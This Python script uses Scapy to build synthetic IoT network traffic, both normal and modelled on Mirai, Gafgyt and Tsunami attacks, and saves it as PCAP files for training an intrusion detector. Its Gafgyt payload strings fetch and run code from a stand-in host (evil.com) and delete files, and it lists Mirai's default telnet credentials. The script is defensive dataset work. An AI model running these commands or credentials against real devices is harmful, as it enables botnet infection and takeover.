#!/usr/bin/env python3
"""
IoT Network Traffic Simulator
Generates realistic network packets for normal traffic, Mirai attacks, and other IoT malware patterns
using Scapy for federated learning training data.
"""

import random
import time
import logging
from datetime import datetime, timedelta
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether
from typing import List, Dict, Tuple

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class IoTTrafficSimulator:
    """
    Comprehensive IoT network traffic simulator for generating realistic packets
    """
    
    def __init__(self):
        # Common IoT device IP ranges
        self.iot_subnets = [
            "192.168.1.0/24",
            "192.168.0.0/24", 
            "10.0.0.0/24",
            "172.16.0.0/24"
        ]
        
        # Common IoT device types and their typical behaviors
        self.device_profiles = {
            'smart_camera': {
                'ports': [80, 443, 554, 8080, 8181],  # HTTP, HTTPS, RTSP
                'protocols': ['TCP', 'UDP'],
                'packet_sizes': (64, 1500),
                'traffic_pattern': 'continuous'
            },
            'smart_bulb': {
                'ports': [80, 443, 1883, 8883],  # HTTP, HTTPS, MQTT
                'protocols': ['TCP', 'UDP'],
                'packet_sizes': (40, 200),
                'traffic_pattern': 'periodic'
            },
            'router': {
                'ports': [22, 23, 53, 80, 443, 8080],  # SSH, Telnet, DNS, HTTP
                'protocols': ['TCP', 'UDP'],
                'packet_sizes': (40, 1500),
                'traffic_pattern': 'mixed'
            },
            'smart_thermostat': {
                'ports': [80, 443, 1883],
                'protocols': ['TCP', 'UDP'],
                'packet_sizes': (40, 300),
                'traffic_pattern': 'periodic'
            },
            'baby_monitor': {
                'ports': [80, 443, 554, 8080],
                'protocols': ['TCP', 'UDP'],
                'packet_sizes': (100, 1400),
                'traffic_pattern': 'continuous'
            }
        }
        
        # Attack patterns
        self.attack_patterns = {
            'mirai': {
                'scan_ports': [23, 2323, 80, 8080, 443, 8443, 7547],
                'flood_ports': [53, 80, 443],
                'payload_sizes': (1, 1500),
                'scan_rate': 'high',  # packets per second
                'characteristics': 'telnet_brute_force'
            },
            'gafgyt': {
                'scan_ports': [23, 22, 80, 8080, 2323],
                'flood_ports': [80, 443],
                'payload_sizes': (1, 1200),
                'scan_rate': 'medium',
                'characteristics': 'tcp_syn_flood'
            },
            'tsunami': {
                'scan_ports': [22, 23, 80, 443],
                'flood_ports': [80, 443, 53],
                'payload_sizes': (50, 1000),
                'scan_rate': 'variable',
                'characteristics': 'udp_flood'
            }
        }

    def generate_iot_ip(self, subnet: str = None) -> str:
        """Generate a random IoT device IP address"""
        if not subnet:
            subnet = random.choice(self.iot_subnets)
        
        # Extract base IP and generate device IP
        base_ip = subnet.split('/')[0].rsplit('.', 1)[0]
        device_id = random.randint(10, 254)
        return f"{base_ip}.{device_id}"

    def generate_external_ip(self) -> str:
        """Generate external IP for internet traffic"""
        return f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def create_normal_traffic(self, num_packets: int = 1000, device_type: str = None) -> List[Packet]:
        """
        Generate normal IoT traffic patterns
        """
        packets = []
        
        if not device_type:
            device_type = random.choice(list(self.device_profiles.keys()))
        
        profile = self.device_profiles[device_type]
        logger.info(f"Generating {num_packets} normal packets for {device_type}")
        
        for i in range(num_packets):
            # Source: IoT device, Destination: External server or local network
            src_ip = self.generate_iot_ip()
            
            if random.random() < 0.3:  # 30% local traffic
                dst_ip = self.generate_iot_ip()
            else:  # 70% external traffic
                dst_ip = self.generate_external_ip()
            
            # Select protocol and ports
            protocol = random.choice(profile['protocols'])
            src_port = random.randint(1024, 65535)
            dst_port = random.choice(profile['ports'])
            
            # Create base packet
            if protocol == 'TCP':
                packet = self._create_tcp_packet(src_ip, dst_ip, src_port, dst_port, 
                                                profile['packet_sizes'])
            else:  # UDP
                packet = self._create_udp_packet(src_ip, dst_ip, src_port, dst_port, 
                                                profile['packet_sizes'])
            
            packets.append(packet)
            
            # Add realistic timing
            if profile['traffic_pattern'] == 'periodic':
                time.sleep(random.uniform(0.1, 2.0))
            elif profile['traffic_pattern'] == 'continuous':
                time.sleep(random.uniform(0.01, 0.1))
        
        return packets

    def create_mirai_attack(self, num_packets: int = 1000, attack_phase: str = 'scan') -> List[Packet]:
        """
        Generate Mirai botnet attack patterns
        """
        packets = []
        logger.info(f"Generating {num_packets} Mirai {attack_phase} packets")
        
        if attack_phase == 'scan':
            packets.extend(self._create_mirai_scan(num_packets))
        elif attack_phase == 'infection':
            packets.extend(self._create_mirai_infection(num_packets))
        elif attack_phase == 'ddos':
            packets.extend(self._create_mirai_ddos(num_packets))
        else:
            # Mixed attack
            packets.extend(self._create_mirai_scan(num_packets // 3))
            packets.extend(self._create_mirai_infection(num_packets // 3))
            packets.extend(self._create_mirai_ddos(num_packets // 3))
        
        return packets

    def _create_mirai_scan(self, num_packets: int) -> List[Packet]:
        """Create Mirai scanning behavior - rapid port scanning"""
        packets = []
        scan_ports = self.attack_patterns['mirai']['scan_ports']
        
        for i in range(num_packets):
            src_ip = self.generate_iot_ip()  # Infected device
            dst_ip = self.generate_iot_ip()  # Target device
            
            # Rapid port scanning
            dst_port = random.choice(scan_ports)
            src_port = random.randint(1024, 65535)
            
            # Create TCP SYN packet (typical for port scanning)
            packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
                sport=src_port, 
                dport=dst_port, 
                flags="S",  # SYN flag
                seq=random.randint(1, 4294967295)
            )
            
            # Add Mirai-specific characteristics
            if dst_port in [23, 2323]:  # Telnet ports
                # Add telnet brute force payload
                telnet_payload = self._get_mirai_telnet_payload()
                packet = packet / Raw(load=telnet_payload)
            
            packets.append(packet)
        
        return packets

    def _create_mirai_infection(self, num_packets: int) -> List[Packet]:
        """Create Mirai infection/propagation traffic"""
        packets = []
        
        for i in range(num_packets):
            src_ip = self.generate_iot_ip()  # Infected device
            dst_ip = self.generate_iot_ip()  # Target device
            
            # Telnet brute force attempts
            packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
                sport=random.randint(1024, 65535),
                dport=23,  # Telnet
                flags="PA",  # PUSH+ACK
                seq=random.randint(1, 4294967295)
            )
            
            # Add brute force payload
            credentials = self._get_mirai_credentials()
            packet = packet / Raw(load=credentials)
            
            packets.append(packet)
        
        return packets

    def _create_mirai_ddos(self, num_packets: int) -> List[Packet]:
        """Create Mirai DDoS attack traffic"""
        packets = []
        flood_ports = self.attack_patterns['mirai']['flood_ports']
        
        for i in range(num_packets):
            src_ip = self.generate_iot_ip()  # Botnet member
            dst_ip = self.generate_external_ip()  # DDoS target
            
            flood_type = random.choice(['syn_flood', 'udp_flood', 'http_flood'])
            
            if flood_type == 'syn_flood':
                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice(flood_ports),
                    flags="S",
                    seq=random.randint(1, 4294967295)
                )
            elif flood_type == 'udp_flood':
                packet = Ether() / IP(src=src_ip, dst=dst_ip) / UDP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice(flood_ports)
                ) / Raw(load="A" * random.randint(64, 1024))
            else:  # HTTP flood
                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=80,
                    flags="PA"
                ) / Raw(load=self._get_http_flood_payload())
            
            packets.append(packet)
        
        return packets

    def create_gafgyt_attack(self, num_packets: int = 1000) -> List[Packet]:
        """Generate Gafgyt (Bashlite) attack patterns"""
        packets = []
        logger.info(f"Generating {num_packets} Gafgyt attack packets")
        
        for i in range(num_packets):
            src_ip = self.generate_iot_ip()
            dst_ip = self.generate_iot_ip() if random.random() < 0.5 else self.generate_external_ip()
            
            attack_type = random.choice(['scan', 'exploit', 'ddos'])
            
            if attack_type == 'scan':
                # Similar to Mirai but different port preferences
                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice([22, 23, 80, 8080, 2323]),
                    flags="S"
                )
            elif attack_type == 'exploit':
                # Shell command injection attempts
                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=80,
                    flags="PA"
                ) / Raw(load=self._get_gafgyt_exploit_payload())
            else:  # DDoS
                packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice([80, 443]),
                    flags="S"
                )
            
            packets.append(packet)
        
        return packets

    def create_tsunami_attack(self, num_packets: int = 1000) -> List[Packet]:
        """Generate Tsunami (Kaiten variant) attack patterns"""
        packets = []
        logger.info(f"Generating {num_packets} Tsunami attack packets")
        
        for i in range(num_packets):
            src_ip = self.generate_iot_ip()
            dst_ip = self.generate_external_ip()
            
            # Tsunami typically uses UDP floods
            packet = Ether() / IP(src=src_ip, dst=dst_ip) / UDP(
                sport=random.randint(1024, 65535),
                dport=random.choice([53, 80, 443])
            ) / Raw(load="X" * random.randint(50, 1000))
            
            packets.append(packet)
        
        return packets

    def _create_tcp_packet(self, src_ip: str, dst_ip: str, src_port: int, 
                          dst_port: int, size_range: Tuple[int, int]) -> Packet:
        """Create a TCP packet with realistic characteristics"""
        packet = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(
            sport=src_port,
            dport=dst_port,
            flags="PA",  # PUSH+ACK for data transfer
            seq=random.randint(1, 4294967295),
            ack=random.randint(1, 4294967295)
        )
        
        # Add realistic payload
        payload_size = random.randint(size_range[0], size_range[1])
        if payload_size > 40:  # Account for headers
            payload = self._generate_realistic_payload(dst_port, payload_size - 40)
            packet = packet / Raw(load=payload)
        
        return packet

    def _create_udp_packet(self, src_ip: str, dst_ip: str, src_port: int, 
                          dst_port: int, size_range: Tuple[int, int]) -> Packet:
        """Create a UDP packet with realistic characteristics"""
        packet = Ether() / IP(src=src_ip, dst=dst_ip) / UDP(
            sport=src_port,
            dport=dst_port
        )
        
        # Add realistic payload
        payload_size = random.randint(size_range[0], size_range[1])
        if payload_size > 28:  # Account for headers
            payload = self._generate_realistic_payload(dst_port, payload_size - 28)
            packet = packet / Raw(load=payload)
        
        return packet

    def _generate_realistic_payload(self, port: int, size: int) -> bytes:
        """Generate realistic payload based on port/protocol"""
        if port == 80:  # HTTP
            return self._get_http_payload()[:size]
        elif port == 443:  # HTTPS (encrypted)
            return bytes([random.randint(0, 255) for _ in range(size)])
        elif port == 53:  # DNS
            return self._get_dns_payload()[:size]
        elif port == 1883:  # MQTT
            return self._get_mqtt_payload()[:size]
        elif port == 554:  # RTSP
            return self._get_rtsp_payload()[:size]
        else:
            # Generic payload
            return bytes([random.randint(32, 126) for _ in range(size)])

    def _get_http_payload(self) -> bytes:
        """Generate realistic HTTP request payload"""
        methods = ["GET", "POST", "PUT", "HEAD"]
        paths = ["/", "/index.html", "/api/data", "/config", "/status"]
        method = random.choice(methods)
        path = random.choice(paths)
        
        payload = f"{method} {path} HTTP/1.1\r\n"
        payload += "Host: 192.168.1.1\r\n"
        payload += "User-Agent: IoTDevice/1.0\r\n"
        payload += "Accept: */*\r\n\r\n"
        
        return payload.encode()

    def _get_dns_payload(self) -> bytes:
        """Generate realistic DNS query payload"""
        # Simplified DNS query structure
        return b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'

    def _get_mqtt_payload(self) -> bytes:
        """Generate realistic MQTT payload"""
        # Simplified MQTT message
        return b'\x30\x1a\x00\x04test\x00\x10{"temp": 23.5}'

    def _get_rtsp_payload(self) -> bytes:
        """Generate realistic RTSP payload"""
        return b'DESCRIBE rtsp://192.168.1.100/stream RTSP/1.0\r\nCSeq: 1\r\n\r\n'

    def _get_mirai_telnet_payload(self) -> bytes:
        """Get Mirai telnet brute force payload"""
        usernames = [b"admin", b"root", b"user", b"guest"]
        passwords = [b"admin", b"password", b"123456", b"default", b""]
        
        username = random.choice(usernames)
        password = random.choice(passwords)
        
        return username + b"\r\n" + password + b"\r\n"

    def _get_mirai_credentials(self) -> bytes:
        """Get Mirai credential list for brute force"""
        creds = [
            b"root:xc3511", b"root:vizxv", b"root:admin", b"admin:admin",
            b"root:888888", b"root:xmhdipc", b"root:default", b"root:juantech",
            b"root:123456", b"root:54321"
        ]
        return random.choice(creds)

    def _get_http_flood_payload(self) -> bytes:
        """Get HTTP flood attack payload"""
        return b"GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: Mirai\r\n\r\n"

    def _get_gafgyt_exploit_payload(self) -> bytes:
        """Get Gafgyt shell injection payload"""
        commands = [
            b"wget http://evil.com/bot; chmod +x bot; ./bot",
            b"cd /tmp; rm -rf *; wget http://evil.com/gafgyt",
            b"busybox wget http://evil.com/malware -O /tmp/malware",
            b"curl -O http://evil.com/payload.sh; sh payload.sh"
        ]
        return random.choice(commands)

    def save_packets_to_pcap(self, packets: List[Packet], filename: str):
        """Save generated packets to a PCAP file"""
        logger.info(f"Saving {len(packets)} packets to {filename}")
        wrpcap(filename, packets)

    def generate_mixed_dataset(self, total_packets: int = 10000, 
                             attack_ratio: float = 0.3) -> List[Packet]:
        """
        Generate a mixed dataset with normal and attack traffic
        """
        normal_count = int(total_packets * (1 - attack_ratio))
        attack_count = total_packets - normal_count
        
        packets = []
        
        # Generate normal traffic
        packets.extend(self.create_normal_traffic(normal_count))
        
        # Generate attack traffic (mixed)
        mirai_count = attack_count // 3
        gafgyt_count = attack_count // 3
        tsunami_count = attack_count - mirai_count - gafgyt_count
        
        packets.extend(self.create_mirai_attack(mirai_count, 'mixed'))
        packets.extend(self.create_gafgyt_attack(gafgyt_count))
        packets.extend(self.create_tsunami_attack(tsunami_count))
        
        # Shuffle to mix packet types
        random.shuffle(packets)
        
        return packets

def main():
    import os
    
    # Create output directory
    output_dir = "samplePackets"
    os.makedirs(output_dir, exist_ok=True)
    
    simulator = IoTTrafficSimulator()
    
    print("Generating IoT network packets...")
    
    # Generate different types of traffic
    print("1. Generating normal IoT traffic...")
    normal_packets = simulator.create_normal_traffic(500)
    simulator.save_packets_to_pcap(normal_packets, f"{output_dir}/normal_traffic.pcap")
    
    print("2. Generating Mirai attack packets...")
    mirai_packets = simulator.create_mirai_attack(500, 'mixed')
    simulator.save_packets_to_pcap(mirai_packets, f"{output_dir}/mirai_attack.pcap")
    
    print("3. Generating Gafgyt attack packets...")
    gafgyt_packets = simulator.create_gafgyt_attack(500)
    simulator.save_packets_to_pcap(gafgyt_packets, f"{output_dir}/gafgyt_attack.pcap")
    
    print("4. Generating mixed traffic dataset...")
    mixed_packets = simulator.generate_mixed_dataset(500, 0.3)
    simulator.save_packets_to_pcap(mixed_packets, f"{output_dir}/mixed_traffic.pcap")
    
    print(f"\nPacket generation complete!")
    print(f"Files saved in {output_dir}/ folder:")
    print("- normal_traffic.pcap (1000 packets)")
    print("- mirai_attack.pcap (1000 packets)")
    print("- gafgyt_attack.pcap (1000 packets)")
    print("- mixed_traffic.pcap (5000 packets)")

if __name__ == "__main__":
    main()
